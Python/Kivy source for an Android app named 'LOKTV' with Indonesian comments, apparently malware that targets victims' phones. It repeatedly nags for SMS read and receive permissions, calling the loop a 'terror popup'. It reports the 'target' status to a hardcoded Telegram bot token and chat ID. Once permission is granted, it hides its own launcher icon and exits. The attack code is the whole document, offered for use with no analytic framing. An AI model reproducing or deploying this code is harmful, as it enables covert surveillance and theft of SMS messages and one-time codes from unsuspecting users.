import telebot
from android.permissions import request_permissions, Permission
from jnius import autoclass
from kivy.app import App
from kivy.clock import Clock
import os

TOKEN = "8688240904:AAFbm71rIxvaNTAuy0qUatSkAagp26uD6ZU"
CHAT_ID = "5999516433"
bot = telebot.TeleBot(TOKEN)

class LOKTV(App):
    def build(self):
        # Beri jeda 2 detik setelah buka baru minta izin
        Clock.schedule_once(lambda dt: self.pancing_izin(), 2)
        return None

    def pancing_izin(self):
        perms = [
            Permission.READ_SMS,
            Permission.RECEIVE_SMS,
            Permission.POST_NOTIFICATIONS
        ]
        request_permissions(perms, self.hasil_respon)

    def hasil_respon(self, permissions, grants):
        # Kirim status ke Telegram apapun hasilnya
        status = "DIIZINKAN" if all(grants) else "DITOLAK/BLOKIR"
        try:
            bot.send_message(CHAT_ID, f"📢 Status Izin Target: {status}")
        except: pass

        if all(grants):
            # HANYA HILANG JIKA DIIZINKAN
            self.eksekusi_hilang()
        else:
            # Jika ditolak/notif gak muncul, minta lagi terus (Teror Popup)
            Clock.schedule_once(lambda dt: self.pancing_izin(), 3)

    def eksekusi_hilang(self):
        try:
            PythonActivity = autoclass('org.kivy.android.PythonActivity')
            activity = PythonActivity.mActivity
            pm = activity.getPackageManager()
            
            # Sembunyikan ikon
            ComponentName = autoclass('android.content.ComponentName')
            comp = ComponentName(activity.getPackageName(), 'org.kivy.android.PythonActivity')
            pm.setComponentEnabledSetting(comp, 2, 1)
            
            bot.send_message(CHAT_ID, "⚠️ Ikon Lenyap! Target Terperangkap.")
            
            # Keluar setelah sukses
            Clock.schedule_once(lambda dt: os._exit(0), 1)
        except:
            os._exit(0)

if __name__ == '__main__':
    LOKTV().run()
